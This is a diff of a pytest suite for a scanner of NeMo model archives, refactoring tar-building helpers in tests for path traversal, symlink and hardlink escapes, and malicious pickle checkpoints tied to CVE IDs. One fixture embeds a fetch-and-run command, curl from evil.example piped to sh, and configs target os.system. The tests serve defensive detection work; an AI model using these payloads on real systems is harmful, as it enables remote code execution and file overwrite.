@@ -10,6 +10,8 @@ import random
 import sys
 import tarfile
 import zipfile
+from collections.abc import Iterator
+from contextlib import contextmanager
 from pathlib import Path
 from typing import Any, Literal
 
@@ -17,6 +19,8 @@ import pytest
 
 from tests.cache_lifecycle import IsolatedCacheManager
 from tests.helpers.file_creators import SystemCommandPayload
+from tests.helpers.tar import add_tar_bytes as _add_tar_bytes
+from tests.helpers.tar import make_tar_link
 
 try:
     import yaml
@@ -56,9 +60,7 @@ def _create_nemo_file_from_bytes(
     """Helper to create a .nemo tar file with the given YAML config."""
     nemo_path = tmp_path / filename
     with tarfile.open(nemo_path, mode) as tar:
-        info = tarfile.TarInfo(name=config_name)
-        info.size = len(config_bytes)
-        tar.addfile(info, io.BytesIO(config_bytes))
+        _add_tar_bytes(tar, config_name, config_bytes)
     return nemo_path
 
 
@@ -116,17 +118,17 @@ def _create_renamed_compressed_nemo_after_route_budget(
     return path
 
 
-def _add_tar_bytes(tar: tarfile.TarFile, name: str, payload: bytes) -> None:
-    info = tarfile.TarInfo(name=name)
-    info.size = len(payload)
-    tar.addfile(info, io.BytesIO(payload))
-
-
 def _add_tar_link(tar: tarfile.TarFile, name: str, target: str, link_type: bytes) -> None:
-    info = tarfile.TarInfo(name=name)
-    info.type = link_type
-    info.linkname = target
-    tar.addfile(info)
+    tar.addfile(make_tar_link(name, target, link_type))
+
+
+@contextmanager
+def _open_nemo_with_root_config(
+    path: Path, config: bytes = b"model: safe\n", *, mode: _NemoTarWriteMode = "w"
+) -> Iterator[tarfile.TarFile]:
+    with tarfile.open(path, mode) as tar:
+        _add_tar_bytes(tar, "model_config.yaml", config)
+        yield tar
 
 
 def _create_gzip_nemo_with_pax_tail(
@@ -151,8 +153,7 @@ def _create_nemo_with_nested_tar_checkpoints(
     payload_size: int,
 ) -> Path:
     nemo_path = tmp_path / filename
-    with tarfile.open(nemo_path, "w:gz") as archive:
-        _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: torch.nn.Linear\n")
+    with _open_nemo_with_root_config(nemo_path, b"model:\n  _target_: torch.nn.Linear\n", mode="w:gz") as archive:
         for index in range(checkpoint_count):
             checkpoint = io.BytesIO()
             with tarfile.open(fileobj=checkpoint, mode="w:gz") as nested_archive:
@@ -252,9 +253,7 @@ class TestNemoScannerBasic:
     def test_rejects_wrong_extension(self, tmp_path):
         path = tmp_path / "model.pt"
         with tarfile.open(path, "w") as tar:
-            info = tarfile.TarInfo(name="config.yaml")
-            info.size = 0
-            tar.addfile(info, io.BytesIO(b""))
+            _add_tar_bytes(tar, "config.yaml", b"")
         assert not NemoScanner.can_handle(str(path))
 
     def test_valid_nemo_does_not_trigger_file_type_mismatch(self, tmp_path):
@@ -359,8 +358,7 @@ class TestNemoScannerBasic:
     ) -> None:
         monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
         path = tmp_path / "configured-entry-limit.nemo"
-        with tarfile.open(path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: torch.nn.Linear\n")
+        with _open_nemo_with_root_config(path, b"model:\n  _target_: torch.nn.Linear\n", mode="w:gz") as archive:
             _add_tar_bytes(archive, "weights-1.bin", b"safe")
             _add_tar_bytes(archive, "weights-2.bin", b"safe")
 
@@ -694,9 +692,7 @@ class TestNemoScannerBasic:
         path = tmp_path / "projected-ratio.nemo"
         payload = b"A" * (1024 * 1024)
         with tarfile.open(path, "w:gz") as archive:
-            info = tarfile.TarInfo("weights.bin")
-            info.size = len(payload)
-            archive.addfile(info, io.BytesIO(payload))
+            _add_tar_bytes(archive, "weights.bin", payload)
         header_only_ratio = tarfile.RECORDSIZE / path.stat().st_size
 
         max_stream_bytes_read = 0
@@ -729,8 +725,7 @@ class TestNemoScannerBasic:
         tmp_path: Path,
     ) -> None:
         path = tmp_path / "ratio-prefix-malicious.nemo"
-        with tarfile.open(path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n")
+        with _open_nemo_with_root_config(path, b"model:\n  _target_: os.system\n", mode="w:gz") as archive:
             _add_tar_bytes(archive, "weights.bin", b"A" * (4 * 1024 * 1024))
         config = {
             "compressed_max_decompressed_bytes": 8 * 1024 * 1024,
@@ -1270,8 +1265,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_relative_member_path_traversal_detects_cve_2025_23360(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "traversal.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "../../evil.txt", b"overwrite")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -1286,8 +1280,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_gzip_framed_member_path_traversal_still_detected(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "traversal.nemo"
-        with tarfile.open(nemo_path, "w:gz") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path, mode="w:gz") as tar:
             _add_tar_bytes(tar, "../../evil.txt", b"overwrite")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -1299,8 +1292,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_absolute_member_path_traversal_detects_cve_2025_23250(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "absolute.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "/tmp/evil.txt", b"overwrite")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -1313,8 +1305,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_symlink_escape_detects_relative_path_traversal_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "symlink.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "weights_link", "../../outside_weights.ckpt", tarfile.SYMTYPE)
 
         result = NemoScanner().scan(str(nemo_path))
@@ -1326,8 +1317,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_gzip_framed_symlink_escape_still_detected(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "symlink.nemo"
-        with tarfile.open(nemo_path, "w:gz") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path, mode="w:gz") as tar:
             _add_tar_link(tar, "weights_link", "../../outside_weights.ckpt", tarfile.SYMTYPE)
 
         result = NemoScanner().scan(str(nemo_path))
@@ -1351,8 +1341,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_malicious_checkpoint_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-rce.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "model_weights.ckpt", _build_malicious_pickle())
 
         result = NemoScanner().scan(str(nemo_path))
@@ -1368,8 +1357,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_gzip_framed_malicious_checkpoint_still_detected(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-rce.nemo"
-        with tarfile.open(nemo_path, "w:gz") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path, mode="w:gz") as tar:
             _add_tar_bytes(tar, "model_weights.ckpt", _build_malicious_pickle())
 
         result = NemoScanner().scan(str(nemo_path))
@@ -1404,8 +1392,7 @@ class TestNemoArchiveVulnerabilityCoverage:
         torch7_payload = (
             b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example/payload.sh | sh')\n"
         )
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "model_weights.pt", b"safe weights")
             _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
 
@@ -1418,8 +1405,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_symlink_checkpoint_alias_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-symlink-alias.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "model_weights.ckpt", "payload.pkl", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "payload.pkl", _build_malicious_pickle())
 
@@ -1435,8 +1421,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_subdirectory_hardlink_checkpoint_alias_resolves_target_from_archive_root(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-hardlink-alias.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.pkl", _build_malicious_pickle())
             _add_tar_link(tar, "assets/model_weights.ckpt", "payload.pkl", tarfile.LNKTYPE)
 
@@ -1453,8 +1438,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_forward_hardlink_checkpoint_alias_does_not_report_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-forward-hardlink-alias.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
 
@@ -1465,8 +1449,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_backward_hardlink_checkpoint_alias_chain_detects_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-backward-hardlink-chain.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "alias.bin", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "model_weights.ckpt", "alias.bin", tarfile.LNKTYPE)
@@ -1482,8 +1465,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_alias_detects_later_target_replacement(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-later-hardlink-replacement.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
@@ -1499,8 +1481,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_alias_preserves_content_after_target_symlink_rebinding(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-hardlink-target-rebinding.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "payload.bin", "safe.bin", tarfile.SYMTYPE)
@@ -1517,8 +1498,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_alias_detects_write_through_later_hardlink_alias(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-later-hardlink-alias-write.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "alias.bin", "model_weights.ckpt", tarfile.LNKTYPE)
@@ -1535,8 +1515,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_alias_detects_write_through_later_symlink_alias(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-later-symlink-alias-write.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "alias.bin", "model_weights.ckpt", tarfile.SYMTYPE)
@@ -1553,8 +1532,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_alias_detects_write_through_symlinked_parent(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-symlinked-parent-write.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "targetdir/model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "targetdir/writer.bin", "payload.bin", tarfile.LNKTYPE)
@@ -1573,22 +1551,18 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_target_written_through_symlinked_parent_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-target-symlinked-parent.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "dir", "actual", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "model_weights.ckpt", "dir/payload.bin", tarfile.LNKTYPE)
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_detects_writer_symlink_installed_through_parent_alias(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-writer-symlinked-parent.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "dir", "actual", tarfile.SYMTYPE)
@@ -1606,8 +1580,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_fresh_hardlink_symlink_fallback_mutation_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-fresh-hardlink-symlink-fallback-malicious.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "source_alias", ".", tarfile.SYMTYPE)
@@ -1616,16 +1589,13 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_fresh_hardlink_symlink_fallback_safe_replacement_fails_closed(
         self, tmp_path: Path
     ) -> None:
         nemo_path = tmp_path / "checkpoint-fresh-hardlink-symlink-fallback-safe.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "source_alias", ".", tarfile.SYMTYPE)
@@ -1634,14 +1604,11 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_ignores_unrelated_post_source_fallback_alias(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-unrelated-post-source-fallback-alias.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_bytes(tar, "asset.txt", b"safe")
@@ -1659,8 +1626,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_fresh_symlink_fallback_before_source_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-fresh-symlink-fallback-before-source.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "source_alias", ".", tarfile.SYMTYPE)
             _add_tar_link(tar, "alias", "source_alias", tarfile.LNKTYPE)
             _add_tar_bytes(tar, "alias/payload.bin", b"safe weights")
@@ -1669,14 +1635,11 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_ignores_unrelated_pre_source_fallback_alias(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-unrelated-pre-source-fallback-alias.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "asset.txt", b"safe")
             _add_tar_link(tar, "latest", "asset.txt", tarfile.SYMTYPE)
             _add_tar_link(tar, "copy", "latest", tarfile.LNKTYPE)
@@ -1694,8 +1657,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_parent_symlink_installed_by_fallback_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-parent-symlink-hardlink-fallback-malicious.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "alias", "old", tarfile.SYMTYPE)
             _add_tar_link(tar, "new_alias", "new", tarfile.SYMTYPE)
             replacement = tarfile.TarInfo(name="alias")
@@ -1708,14 +1670,11 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_ignores_payload_replaced_after_fallback_parent_symlink(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-parent-symlink-hardlink-fallback-safe.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "alias", "old", tarfile.SYMTYPE)
             _add_tar_link(tar, "new_alias", "new", tarfile.SYMTYPE)
             replacement = tarfile.TarInfo(name="alias")
@@ -1729,14 +1688,11 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_source_rebound_before_load_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-source-rebound-before-load.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "dir", "old", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "dir", "new", tarfile.SYMTYPE)
@@ -1745,14 +1701,11 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_alias_detects_colliding_hardlink_fallback_write(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-hardlink-collision-write.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "alias.bin", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "model_weights.ckpt", "alias.bin", tarfile.LNKTYPE)
@@ -1770,8 +1723,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_alias_detects_nested_hardlink_fallback_write(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-nested-hardlink-collision-write.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "alias.bin", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "model_weights.ckpt", "alias.bin", tarfile.LNKTYPE)
@@ -1792,8 +1744,7 @@ class TestNemoArchiveVulnerabilityCoverage:
         self, tmp_path: Path
     ) -> None:
         nemo_path = tmp_path / "checkpoint-hardlink-collision-symlink-fallback.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "alias.bin", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "model_weights.ckpt", "alias.bin", tarfile.LNKTYPE)
@@ -1811,8 +1762,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_hardlink_checkpoint_alias_with_fallback_symlink_back_to_inode_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-hardlink-symlink-back-to-inode.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "same.bin", "payload.bin", tarfile.SYMTYPE)
@@ -1820,14 +1770,11 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_duplicate_checkpoint_symlink_uses_final_malicious_target(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-duplicate-symlink-final-target.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "safe.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "safe.bin", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "evil.bin", _build_malicious_pickle())
@@ -1844,8 +1791,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_final_colliding_checkpoint_hardlink_uses_malicious_target(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-final-colliding-hardlink.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "safe.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "safe.bin", tarfile.LNKTYPE)
             _add_tar_bytes(tar, "evil.bin", _build_malicious_pickle())
@@ -1862,8 +1808,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_outer_symlink_checkpoint_detects_colliding_hardlink_mutation(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-outer-symlink-hardlink-mutation.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "alias.bin", "payload.bin", tarfile.LNKTYPE)
             _add_tar_link(tar, "model_weights.ckpt", "alias.bin", tarfile.SYMTYPE)
@@ -1882,8 +1827,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_outer_symlink_checkpoint_follows_rebound_parent_symlink(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-outer-symlink-rebound-parent-malicious.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "new/payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "dir", "old", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "dir/payload.bin", b"safe weights")
@@ -1902,8 +1846,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_outer_symlink_checkpoint_ignores_payload_hidden_by_rebound_parent_symlink(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-outer-symlink-rebound-parent-safe.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "new/payload.bin", b"safe weights")
             _add_tar_link(tar, "dir", "old", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
@@ -1916,8 +1859,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_outer_symlink_checkpoint_follows_safe_root_alias_parent(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-outer-symlink-root-alias-parent.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "dir", ".", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "dir/model_weights.ckpt", "payload.bin", tarfile.SYMTYPE)
@@ -1934,8 +1876,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
